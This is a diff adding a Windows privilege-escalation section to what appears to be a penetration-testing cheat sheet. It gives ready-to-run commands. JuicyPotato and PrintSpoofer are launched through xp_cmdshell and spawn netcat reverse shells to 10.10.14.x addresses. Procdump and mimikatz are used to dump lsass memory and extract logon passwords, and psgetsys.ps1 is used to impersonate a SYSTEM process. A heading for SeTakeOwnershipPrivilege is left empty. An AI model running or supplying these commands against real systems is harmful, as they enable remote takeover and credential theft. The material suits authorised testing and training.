@@ -521,6 +521,31 @@ set-location C:\Tools\Accesschk\
 .\accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v
 ```
 
+#### User Privilege
+
+If Privilege Name = SeImpersonatePrivilege (Like sudo)  
+```Powershell
+xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.134 8888 -e cmd.exe" -t *
+xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
+```
+
+If Privilege Name = SeDebugPrivilege (can be used to capture sensitive information from system memory, or access/modify kernel and application structures)  
+```PowerShell
+# Catch NTML hash
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe
+log
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords
+
+# Or RCE
+# install psgetsys.ps1 script here : https://github.com/decoder-it/psgetsystem
+. .\psgetsys.ps1
+ImpersonateFromParentPid -ppid 6236 -command "c:\Windows\System32\cmd.exe" -cmdargs ""
+```
+
+If Privilege Name = SeTakeOwnershipPrivilege  
+
 ### Active directory
 
 ## Attacking WI-FI _(WPS,WPA,WPA2)_
